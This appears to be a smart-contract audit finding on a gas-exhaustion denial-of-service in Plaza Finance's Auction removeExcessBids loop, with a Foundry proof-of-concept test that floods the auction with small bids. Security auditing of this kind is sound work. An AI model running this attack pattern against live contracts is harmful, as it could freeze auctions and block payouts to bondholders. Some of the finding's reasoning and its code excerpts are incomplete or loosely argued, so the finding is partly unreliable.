# ### Unbounded Loop in  `Auction:: removeExcessBids` function causes DOS in `bid`.

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L250



### summary
 The issue arises from an unbounded loop that processes bids sequentially without limits, resulting in excessive gas consumption when handling a large number of small bids requiring removal in `removeExcessBids`. 
An attacker can force the `Auction:: removeExcessBids`  to process numerous small bids, each requiring partial reductions, which results in excessive gas consumption. This ultimately causes the transaction to fail due to exceeding the gas limit.This issue directly affects the `bid` function, making it prohibitively expensive to execute. In turn, the auction becomes unusable for future legitimate bids, disrupting the auction process.

### Root Cause
The core of the vulnerability lies in the unbounded loop in the removeExcessBids function, which processes all excess bids sequentially without any gas limit or iteration controls. The function does not limit the number of iterations, which means that if there are many bids to process, the loop can consume a significant amount of gas and potentially cause the transaction to revert before completion.

Since there is no bounded iterations, the function can run indefinitely or until it consumes all available gas, especially when there are many bids in the auction with small amounts to be removed.

```javascript


function removeExcessBids() internal {
    if (currentCouponAmount <= totalBuyCouponAmount) {
      return;
    }

    uint256 amountToRemove = currentCouponAmount - totalBuyCouponAmount;
    uint256 currentIndex = lowestBidIndex;


    while (currentIndex != 0 && amountToRemove != 0) {
      // Cache the current bid's data into local variables
      Bid storage currentBid = bids[currentIndex];
      uint256 sellCouponAmount = currentBid.sellCouponAmount;
      uint256 prevIndex = currentBid.prevBidIndex;

      if (amountToRemove >= sellCouponAmount) {
        // Subtract the sellAmount from amountToRemove
        amountToRemove -= sellCouponAmount;

        // Remove the bid
        _removeBid(currentIndex);

        // Move to the previous bid (higher price)
        currentIndex = prevIndex;

```
If `currentIndex` keeps moving through bids and the number of bids is large, the contract could get stuck iterating without making progress, wasting gas and potentially preventing legitimate bids from being processed.



### Attack Path
- The auction collects a large number of bids, creating an extensive array of entries in the bids data structure.
- The attacker submits multiple small bids, each with amounts that are slightly above the threshold required for removal. This would cause the removeExcessBids function to need to process many small bids.
- When a legitimate user attempts to place a new bid:
    - The removeExcessBids function is triggered to remove excess bids and free space for the new bid.
    - The unbounded loop processes all bids, consuming excessive gas due to token transfers, storage writes, and array modifications.
    - If the gas required exceeds the block gas limit, the transaction reverts, leaving the auction in a locked state.




### Impact
When the transaction fails, no bids are removed, and the auction cannot accept new bids, making the auction unusable. The auction could be effectively "stuck," preventing new bids from being placed until the issue is resolved.

`distribution` contract relies on the funds raised from the bids to distribute payouts to bond holders. However, due to the Denial of Service (DOS) vulnerability in the `removeExcessBids` function, the auction becomes unusable, which has a cascading effect on the distribution mechanism.


### POC

```javascript
function testDOSInRemoveExcessBids() public {
    // Setup constants for the attack
    uint256 TOTAL_SMALL_BIDS = 800; // Large number of small bids
    uint256 SLOT_SIZE = 1000000000; // 1 USDC
    uint256 SMALL_BID_AMOUNT = 1; // Minimum bid amount
    uint256 GAS_REPORT_INTERVAL = 100; // Log gas usage every 100 bids
    uint256 slot = auction.slotSize();
    
    // Track gas usage for analysis
    uint256[] memory gasUsage = new uint256[](TOTAL_SMALL_BIDS / GAS_REPORT_INTERVAL);
    uint256 gasReportIndex = 0;
    
    // 1. First create many small bids just above minimum price
    for (uint256 i = 0; i < TOTAL_SMALL_BIDS; i++) {
        bidder = address(uint160(i + 1));
        
        // Setup bidder
        vm.startPrank(bidder);
        usdc.mint(bidder, 100000000000000 ether);
        usdc.approve(address(auction), 10000000000 ether);
        
        // Measure gas usage periodically
        if (i % GAS_REPORT_INTERVAL == 0) {
            uint256 gasBefore = gasleft();
            auction.bid(SMALL_BID_AMOUNT, slot);
            uint256 gasUsed = gasBefore - gasleft();
            gasUsage[gasReportIndex++] = gasUsed;
            emit log_named_uint("Gas used for bid", gasUsed);
        } else {
            auction.bid(SMALL_BID_AMOUNT, slot);
        }
        
        vm.stopPrank();
    }
    
    // Verify initial state
    assertEq(auction.bidCount(), TOTAL_SMALL_BIDS, "Initial bid count incorrect");
    assertEq(auction.highestBidIndex(), 1, "Initial highest bid index incorrect");
    assertEq(auction.lowestBidIndex(), TOTAL_SMALL_BIDS, "Initial lowest bid index incorrect");
    
    // 2. Now place a large bid that will trigger removal of many small bids
    address largeBidder = address(uint160(TOTAL_SMALL_BIDS + 1));
    uint256 largeBidAmount = SMALL_BID_AMOUNT * 2; // Double the small bid amount
    uint256 largeSellAmount = slot * 100; // Large enough to trigger many removals
    
    vm.startPrank(largeBidder);
    usdc.mint(largeBidder, largeSellAmount);
    usdc.approve(address(auction), largeSellAmount);
    
    // Try to place the large bid and measure gas
    uint256 gasBefore = gasleft();
    
    try auction.bid(largeBidAmount, largeSellAmount) {
        uint256 gasUsed = gasBefore - gasleft();
        emit log_named_uint("Gas used for large bid", gasUsed);
        // fail("Expected the transaction to run out of gas");
    } catch Error(string memory reason) {
        emit log_string("Transaction reverted as expected");
        emit log_string(reason);
    } catch (bytes memory) {
        emit log_string("Transaction ran out of gas as expected");
    }
    
    vm.stopPrank();

gas increase with every iteration making it expensive to call `bid` function.
